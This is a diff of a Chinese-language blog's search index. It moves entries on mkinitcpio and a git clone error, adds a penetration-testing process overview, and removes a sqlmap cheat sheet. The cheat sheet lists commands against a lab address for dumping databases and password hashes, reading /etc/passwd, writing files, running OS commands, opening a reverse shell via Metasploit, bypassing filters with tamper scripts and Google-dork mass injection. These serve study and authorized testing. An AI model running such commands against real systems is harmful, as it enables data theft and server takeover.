class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump -C <span class="string">&quot;column_name&quot;</span> -T <span class="string">&quot;table_name&quot;</span> -D <span class="string">&quot;db_name&quot;</span> -v 0 <span class="comment">#获取字段内容</span></span><br></pre></td></tr></table></figure>
-<a id="more"></a>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 信息获取</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --smart --level 3 --users <span class="comment"># smart 智能 level 执行测试等级</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://92.168.109.139/news?id=1&quot;</span> --dbms <span class="string">&quot;Mysql&quot;</span> --users <span class="comment"># dbms 指定数据库类型</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --users <span class="comment">#列数据库用户</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs<span class="comment">#列数据库</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --passwords <span class="comment">#数据库用户密码</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --passwords-U root -v 0 <span class="comment">#列出指定用户数据库密码</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump -C <span class="string">&quot;password,user,id&quot;</span> -T <span class="string">&quot;tablename&quot;</span> -D <span class="string">&quot;db_name&quot;</span> --start 1 --stop 20 <span class="comment">#列出指定字段，列出 20 条</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump-all -v 0 <span class="comment">#列出所有数据库所有表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --privileges <span class="comment">#查看权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --privileges -U root <span class="comment">#查看指定用户权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --is-dba -v 1 <span class="comment">#是否是数据库管理员</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --roles <span class="comment">#枚举数据库用户角色</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --udf-inject <span class="comment">#导入用户自定义函数（获取系统权限！）</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dump-all --exclude-sysdbs -v 0 <span class="comment">#列出当前库所有表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --union-cols <span class="comment">#union 查询表记录</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http:/192.168.56.3/news?id=1&quot;</span> --cookie <span class="string">&quot;COOKIE_VALUE&quot;</span> <span class="comment">#cookie 注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> -b <span class="comment">#获取 banner 信息</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --data <span class="string">&quot;id=3&quot;</span> <span class="comment">#post 注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> -v 1 -f <span class="comment">#指纹判别数据库类型</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --proxy<span class="string">&quot;http://127.0.0.1:8118&quot;</span> <span class="comment">#代理注入</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span>--string<span class="string">&quot;STRING_ON_TRUE_PAGE&quot;</span> <span class="comment">#指定关键词</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --sql-shell <span class="comment">#执行指定 sql 命令</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --file /etc/passwd  <span class="comment">#必须为dbs权限</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --file-write 本地文件路径 file-dest 目标路径  <span class="comment">#必须为dbs权限(可将本地的某个文件写入到目标路径下)</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-cmd=whoami <span class="comment">#执行系统命令</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-shell <span class="comment">#系统交互 shell</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --os-pwn <span class="comment">#反弹 shell</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --reg-read <span class="comment">#读取 win 系统注册表</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs-o <span class="string">&quot;sqlmap.log&quot;</span> <span class="comment">#保存进度</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --dbs -o <span class="string">&quot;sqlmap.log&quot;</span> --resume <span class="comment">#恢复已保存进度</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --msf-path=/opt/metasploit3/msf2 --os-pwn 反弹 shell 需 metasploit 路径</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --tamper <span class="string">&quot;base64encode.py&quot;</span> 加载脚本(可利用绕过注入限制)</span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --batch --tamper <span class="string">&quot;base64encode.py&quot;</span> 加载脚本(可利用绕过注入限制)</span><br><span class="line">sqlmap -g <span class="string">&quot;google 语法&quot;</span> --dump-all --batch <span class="comment">#google 搜索注入点自动 跑出所有字段</span></span><br><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&quot;</span> --forms  <span class="comment">#post提交方式注入</span></span><br><span class="line">sqlmap.py -r 本地数据包路径 <span class="comment">#post提交方式注入</span></span><br></pre></td></tr></table></figure>
-<h1 id="例"><a href="#例" class="headerlink" title="例"></a>例</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap.py -u <span class="string">&quot;http://192.168.56.3/news?id=1&amp;Submit=Submit&quot;</span> --cookie=<span class="string">&quot;PHPSESSID=41aa833e6d0d28f489ff1ab5a7531406&quot;</span> --string=<span class="string">&quot;Surname&quot;</span> --dbms=mysql --users --password</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>SQL</tag>
-        <tag>SqlMap</tag>
       </tags>
   </entry>
   <entry>
@@ -8766,6 +8771,23 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       </tags>
   </entry>
   <entry>
+    <title>mkinitcpio详解</title>
+    <url>/posts/7cc5c3d6/</url>
+    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>initramfs映像是一个SVR4 CPIO归档文件，通过find和bsdcpio命令生成，可选择使用内核理解的压缩方案进行压缩<br>mkinitcpio是创建initramfs的bash脚本</p>
+<p>每次升级内核，mkinitcpio都会默认创建两个内存盘镜像：默认镜像<code>/boot/initramfs-linux.img</code>和fallback镜像<code>/boot/initramfs-linux-fallback.img</code>。fallback镜像和默认镜像只有一个区别，就是创建时跳过了autodetect钩子扩展，因而它包含更多的内核模块。autodetect扩展会探测硬件信息，针对硬件向镜像添加需要的模块，因此缩小了镜像。</p>
+<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><h3 id="使用默认内核linux生成镜像："><a href="#使用默认内核linux生成镜像：" class="headerlink" title="使用默认内核linux生成镜像："></a>使用默认内核<code>linux</code>生成镜像：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -p linux</span><br></pre></td></tr></table></figure>
+<p><code>-p</code>选项定义了要使用的预配置（preset）；多数内核软件包都会提供一套mkinitcpio预配置文件，放在<code>/etc/mkinitcpio.d</code>目录（比如，linux内核是/etc/mkinitcpio.d/linux.preset）。预配置文件中包含内存盘镜像的基本配置。</p>
+<a id="more"></a>
+<h3 id="生成自定义initcpio"><a href="#生成自定义initcpio" class="headerlink" title="生成自定义initcpio"></a>生成自定义initcpio</h3><p>使用其他配置文件创建镜像，例如以<code>/etc/mkinitcpio-custom.conf</code>配置的内容生成镜像<code>/boot/linux-custom.img</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -c /etc/mkinitcpio-custom.conf -g /boot/linux-custom.img</span><br></pre></td></tr></table></figure></p>
+<p>使用指定内核创建镜像，可在<code>/usr/lib/modules</code>目录下可查看支持的内核<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -g /boot/linux-custom2.img -k 4.19.69-1-MANJARO</span><br></pre></td></tr></table></figure></p>
+<h2 id="mkinitcpio用法："><a href="#mkinitcpio用法：" class="headerlink" title="mkinitcpio用法："></a>mkinitcpio用法：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio [选项]</span><br><span class="line"> 选项：</span><br><span class="line">   -A，--addhooks &lt;hooks&gt; 	将指定的钩子（以逗号分隔）添加到映像</span><br><span class="line">   -c，--config &lt;config&gt; 	使用备用配置文件。 （默认值：/etc/mkinitcpio.conf）</span><br><span class="line">   -g，--generate &lt;路径&gt; 	生成cpio映像并写入指定的路径</span><br><span class="line">   -H，--hookhelp &lt;hookname&gt; 显示给定钩子和退出的帮助</span><br><span class="line">   -h，--<span class="built_in">help</span> 				显示此消息并退出</span><br><span class="line">   -k，--kernel &lt;kernelver&gt; 使用指定的内核版本（默认值：4.19.69-1-MANJARO）</span><br><span class="line">   -L，--listhooks 			列出所有可用的钩子</span><br><span class="line">   -M，--automods 			通过自动检测找到的显示模块</span><br><span class="line">   -n，--nocolor 			禁用彩色输出消息</span><br><span class="line">   -p，--preset &lt;文件&gt; 		从/etc/mkinitcpio.d构建指定的预设</span><br><span class="line">   -P，--allpresets 		处理/etc/mkinitcpio.d中的所有预设文件</span><br><span class="line">   -r，--moduleroot &lt;dir&gt; 	模块的根目录（默认值：/）</span><br><span class="line">   -S，--skiphooks &lt;hooks&gt; 	在构建过程中跳过用逗号分隔的指定钩子</span><br><span class="line">   -s，--save 				保存构建目录。 （默认值：否）</span><br><span class="line">   -d，--genicir &lt;dir&gt; 		将生成的图像写入&lt;dir&gt;</span><br><span class="line">   -t，--builddir &lt;dir&gt; 	使用DIR作为临时构建目录</span><br><span class="line">   -V，--version 			显示版本信息并退出</span><br><span class="line">   -v，--verbose 			详细输出（默认值：no）</span><br><span class="line">   -z，--compress &lt;程序&gt; 	在映像上使用备用压缩器</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
+        <tag>命令</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>i3wm配置美化</title>
     <url>/posts/5f24aa49/</url>
     <content><![CDATA[<h2 id="i3自动运行"><a href="#i3自动运行" class="headerlink" title="i3自动运行"></a>i3自动运行</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> XXX	<span class="comment"># i3在初始化时执行的命令或脚本,重启i3时，exec不会执行</span></span><br><span class="line">exec_always XXX <span class="comment"># 重启i3时执行的命令或脚本</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动不支持启动提醒的脚本或程序时，鼠标指针会逗留在忙碌状态，为排除此现象，可用`--no-startup-id`指令。</span></span><br><span class="line"><span class="built_in">exec</span> --no-startup-id XXX</span><br><span class="line">exec_always --no-startup-id XXX</span><br></pre></td></tr></table></figure>
@@ -8914,23 +8936,6 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       </categories>
       <tags>
         <tag>i3wm</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>mkinitcpio详解</title>
-    <url>/posts/7cc5c3d6/</url>
-    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>initramfs映像是一个SVR4 CPIO归档文件，通过find和bsdcpio命令生成，可选择使用内核理解的压缩方案进行压缩<br>mkinitcpio是创建initramfs的bash脚本</p>
-<p>每次升级内核，mkinitcpio都会默认创建两个内存盘镜像：默认镜像<code>/boot/initramfs-linux.img</code>和fallback镜像<code>/boot/initramfs-linux-fallback.img</code>。fallback镜像和默认镜像只有一个区别，就是创建时跳过了autodetect钩子扩展，因而它包含更多的内核模块。autodetect扩展会探测硬件信息，针对硬件向镜像添加需要的模块，因此缩小了镜像。</p>
-<h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><h3 id="使用默认内核linux生成镜像："><a href="#使用默认内核linux生成镜像：" class="headerlink" title="使用默认内核linux生成镜像："></a>使用默认内核<code>linux</code>生成镜像：</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -p linux</span><br></pre></td></tr></table></figure>
-<p><code>-p</code>选项定义了要使用的预配置（preset）；多数内核软件包都会提供一套mkinitcpio预配置文件，放在<code>/etc/mkinitcpio.d</code>目录（比如，linux内核是/etc/mkinitcpio.d/linux.preset）。预配置文件中包含内存盘镜像的基本配置。</p>
-<a id="more"></a>
-<h3 id="生成自定义initcpio"><a href="#生成自定义initcpio" class="headerlink" title="生成自定义initcpio"></a>生成自定义initcpio</h3><p>使用其他配置文件创建镜像，例如以<code>/etc/mkinitcpio-custom.conf</code>配置的内容生成镜像<code>/boot/linux-custom.img</code><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -c /etc/mkinitcpio-custom.conf -g /boot/linux-custom.img</span><br></pre></td></tr></table></figure></p>
-<p>使用指定内核创建镜像，可在<code>/usr/lib/modules</code>目录下可查看支持的内核<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio -g /boot/linux-custom2.img -k 4.19.69-1-MANJARO</span><br></pre></td></tr></table></figure></p>
-<h2 id="mkinitcpio用法："><a href="#mkinitcpio用法：" class="headerlink" title="mkinitcpio用法："></a>mkinitcpio用法：</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkinitcpio [选项]</span><br><span class="line"> 选项：</span><br><span class="line">   -A，--addhooks &lt;hooks&gt; 	将指定的钩子（以逗号分隔）添加到映像</span><br><span class="line">   -c，--config &lt;config&gt; 	使用备用配置文件。 （默认值：/etc/mkinitcpio.conf）</span><br><span class="line">   -g，--generate &lt;路径&gt; 	生成cpio映像并写入指定的路径</span><br><span class="line">   -H，--hookhelp &lt;hookname&gt; 显示给定钩子和退出的帮助</span><br><span class="line">   -h，--<span class="built_in">help</span> 				显示此消息并退出</span><br><span class="line">   -k，--kernel &lt;kernelver&gt; 使用指定的内核版本（默认值：4.19.69-1-MANJARO）</span><br><span class="line">   -L，--listhooks 			列出所有可用的钩子</span><br><span class="line">   -M，--automods 			通过自动检测找到的显示模块</span><br><span class="line">   -n，--nocolor 			禁用彩色输出消息</span><br><span class="line">   -p，--preset &lt;文件&gt; 		从/etc/mkinitcpio.d构建指定的预设</span><br><span class="line">   -P，--allpresets 		处理/etc/mkinitcpio.d中的所有预设文件</span><br><span class="line">   -r，--moduleroot &lt;dir&gt; 	模块的根目录（默认值：/）</span><br><span class="line">   -S，--skiphooks &lt;hooks&gt; 	在构建过程中跳过用逗号分隔的指定钩子</span><br><span class="line">   -s，--save 				保存构建目录。 （默认值：否）</span><br><span class="line">   -d，--genicir &lt;dir&gt; 		将生成的图像写入&lt;dir&gt;</span><br><span class="line">   -t，--builddir &lt;dir&gt; 	使用DIR作为临时构建目录</span><br><span class="line">   -V，--version 			显示版本信息并退出</span><br><span class="line">   -v，--verbose 			详细输出（默认值：no）</span><br><span class="line">   -z，--compress &lt;程序&gt; 	在映像上使用备用压缩器</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>Linux</tag>
-        <tag>命令</tag>
       </tags>
   </entry>
   <entry>
@@ -12177,6 +12182,18 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
       </tags>
   </entry>
   <entry>
+    <title>克隆代码仓库异常</title>
+    <url>/posts/65b76671/</url>
+    <content><![CDATA[<p>克隆代码仓库出现异常，异常码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error: RPC 失败。curl 18 transfer closed with outstanding read data remaining</span><br><span class="line">fatal: 远端意外挂断了</span><br><span class="line">fatal: 过早的文件结束符（EOF）</span><br><span class="line">fatal: index-pack 失败</span><br></pre></td></tr></table></figure></p>
+<p>这是因为代码仓库过大导致<code>git clone</code>异常，调整传输参数即可，其中<code>524288000 = 500*1024*1024</code>，即<code>500M</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.postBuffer 524288000</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>坑</tag>
+        <tag>git</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>先电云计算PAAS</title>
     <url>/posts/167e2e7c/</url>
     <content><![CDATA[<h2 id="基础环境配置"><a href="#基础环境配置" class="headerlink" title="基础环境配置"></a>基础环境配置</h2><h3 id="server-amp-amp-client"><a href="#server-amp-amp-client" class="headerlink" title="server&amp;&amp;client"></a>server&amp;&amp;client</h3><p><strong><code>vi /etc/selinux/config</code></strong></p>
@@ -12339,18 +12356,6 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
 ]]></content>
       <tags>
         <tag>云计算</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>克隆代码仓库异常</title>
-    <url>/posts/65b76671/</url>
-    <content><![CDATA[<p>克隆代码仓库出现异常，异常码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">error: RPC 失败。curl 18 transfer closed with outstanding read data remaining</span><br><span class="line">fatal: 远端意外挂断了</span><br><span class="line">fatal: 过早的文件结束符（EOF）</span><br><span class="line">fatal: index-pack 失败</span><br></pre></td></tr></table></figure></p>
-<p>这是因为代码仓库过大导致<code>git clone</code>异常，调整传输参数即可，其中<code>524288000 = 500*1024*1024</code>，即<code>500M</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global http.postBuffer 524288000</span><br></pre></td></tr></table></figure>
-]]></content>
-      <tags>
-        <tag>坑</tag>
-        <tag>git</tag>
       </tags>
   </entry>
   <entry>
@@ -12649,6 +12654,122 @@ target 的默认值是&quot;pattern&quot;，表示此&lt;match&gt;单元针对�
 ]]></content>
       <tags>
         <tag>镜像站</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透测试流程</title>
+    <url>/posts/590ce9be/</url>
+    <content><![CDATA[<h1 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h1><p><strong>核心</strong>: 漏洞、漏洞探测、漏洞验证、漏洞利用</p>
+<p>OWASP top 10</p>
+<p><a href="https://owasp.org/www-project-web-security-testing-guide/">Web 安全测试指南（WPWSTG）</a></p>
+<h1 id="通用渗透测试框架"><a href="#通用渗透测试框架" class="headerlink" title="通用渗透测试框架"></a>通用渗透测试框架</h1><h2 id="范围界定"><a href="#范围界定" class="headerlink" title="范围界定"></a>范围界定</h2><p>在开展技术性安全评估之前，务必要观察、研究目标环境的<strong>被测范围</strong>。</p>
+<ul>
+<li>取得授权</li>
+<li>测试对象是什么(baidu.com,news.baidu.com)</li>
+<li>应当采取何种测试方法</li>
+<li>有哪些在渗透测试过程中需要满足的条件</li>
+<li>需要多长时间完成测试任务</li>
+<li>应当达到怎样的任务目标</li>
+</ul>
+<a id="more"></a>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>测试人员需要使用公开资源尽可能的获取目标的相关信息。<br>各种公开资源： 论坛、新闻、媒体文章、社交网络、其它商业或非商业的网站、搜索引擎<br>信息越多，越有利于提高渗透测试的成功率</p>
+<ul>
+<li>DNS 服务器</li>
+<li>路由关系</li>
+<li>Whois 数据库</li>
+<li>电子邮件地址</li>
+<li>电话号码</li>
+<li>学号、工号</li>
+<li>个人信息</li>
+<li>用户帐号</li>
+</ul>
+<h2 id="目标识别"><a href="#目标识别" class="headerlink" title="目标识别"></a>目标识别</h2><p>(资产的收集和整理)</p>
+<p>主要是识别目标的网络状态、操作系统和网路架构。<br>完整的展现目标网络中的各种网路设备或技术的完整关系。</p>
+<ul>
+<li>有哪些设备<ul>
+<li>安全设备</li>
+<li>网络设备</li>
+<li>服务器</li>
+<li>终端PC</li>
+</ul>
+</li>
+<li>如何访问</li>
+</ul>
+<h2 id="服务枚举"><a href="#服务枚举" class="headerlink" title="服务枚举"></a>服务枚举</h2><p>(资产的收集和整理)</p>
+<p>进一步找出在线主机开发的端口，由端口推导出运行的服务</p>
+<p>在线主机开发了哪些端口</p>
+<p>端口上运行的服务及其详细版本</p>
+<p>信息收集内容补充：</p>
+<ul>
+<li>技术架构 (L/WAMP、Apache、IIS、Nginx…)</li>
+<li>开发语言 (PHP、JAVA、Python、Node…)</li>
+<li>开发框架 (vue、thinkphp、springboot、flask、struts2(S2)…)</li>
+<li>开源CMS (discuz、metinfo、dedecms、joomla、drupal、wordpress…)</li>
+<li>前后端分离</li>
+<li>站库分离</li>
+<li>是否有单独的文件服务器</li>
+</ul>
+<h2 id="漏洞映射"><a href="#漏洞映射" class="headerlink" title="漏洞映射"></a>漏洞映射</h2><p>根据已经发现的漏洞和服务程序，查找、分析目标系统中存在的漏洞。</p>
+<p>漏洞探测方法： 工具和手工</p>
+<ul>
+<li>更具组件版本，找漏洞</li>
+<li>逻辑漏洞</li>
+<li>漏洞扫描<ul>
+<li>网络漏洞扫描</li>
+<li>Web漏洞扫描</li>
+</ul>
+</li>
+</ul>
+<h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><p>在目标网络没有直接入口时，利用<strong>欺骗的艺术</strong> 将起到抛砖引玉的作用</p>
+<ul>
+<li>人员定向攻击</li>
+<li>水坑攻击</li>
+<li>鱼叉攻击</li>
+<li>研究法律和规则</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在仔细检查和发现目标系统中存在的漏洞后，就可使用已有的漏洞利用程序对目标进行渗透</p>
+<p>主要目的是控制目标系统</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>获取目标系统的控制权是渗透测试成功的标志</p>
+<ul>
+<li>root</li>
+<li>system</li>
+</ul>
+<h2 id="范围维护"><a href="#范围维护" class="headerlink" title="范围维护"></a>范围维护</h2><p>在一定时间内，需要维护目标系统的访问权限</p>
+<ul>
+<li>隐藏后面</li>
+<li>隧道技术</li>
+</ul>
+<h2 id="文档报告"><a href="#文档报告" class="headerlink" title="文档报告"></a>文档报告</h2><p>编写书面报告只能给甲方的某个负责人看</p>
+<ul>
+<li>措辞</li>
+<li>漏洞分析<ul>
+<li>漏洞名称</li>
+<li>漏洞概述</li>
+<li>风险等级</li>
+<li>漏洞点</li>
+<li>漏洞验证</li>
+<li>修复方案</li>
+</ul>
+</li>
+<li>保密<ul>
+<li>渗透测试报告只能给甲方的某个负责人看</li>
+</ul>
+</li>
+</ul>
+<h1 id="简化渗透测试流程"><a href="#简化渗透测试流程" class="headerlink" title="简化渗透测试流程"></a>简化渗透测试流程</h1><ul>
+<li>明确目标</li>
+<li>信息收集</li>
+<li>漏洞探测</li>
+<li>漏洞验证</li>
+<li>漏洞利用</li>
+<li>形成报告</li>
+</ul>
+]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
       </tags>
   </entry>
   <entry>
